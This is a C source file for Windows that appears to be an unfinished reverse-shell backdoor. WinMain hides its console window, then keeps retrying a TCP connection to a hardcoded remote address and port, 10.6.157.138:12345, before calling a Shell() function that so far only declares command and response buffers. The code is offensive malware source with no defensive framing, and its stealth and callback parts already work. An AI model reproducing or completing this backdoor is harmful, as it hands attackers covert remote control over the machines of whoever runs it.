#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int sock;

void Shell(){
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    




}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    // the server side 
    struct sockaddr_in serverAddr;
    unsigned short serverPort = 12345; // Example port number
    char *serverIp;
    WSADATA wsaDATA;
    serverIp = "10.6.157.138";

    if (WSAStartup(MAKEWORD(2, 0), &wsaDATA) != 0){
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        exit(1);
    }

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);
    serverAddr.sin_port = htons(serverPort);

    // the socket is what connects the client and the server 
    while (connect(sock, (struct sockaddr * ) &serverAddr, sizeof(serverAddr) ) != 0){
        Sleep(10);
    }
    // Additional code to connect the socket would go here
    Shell();


    return 0;
}

int main(){
    return 0;
}
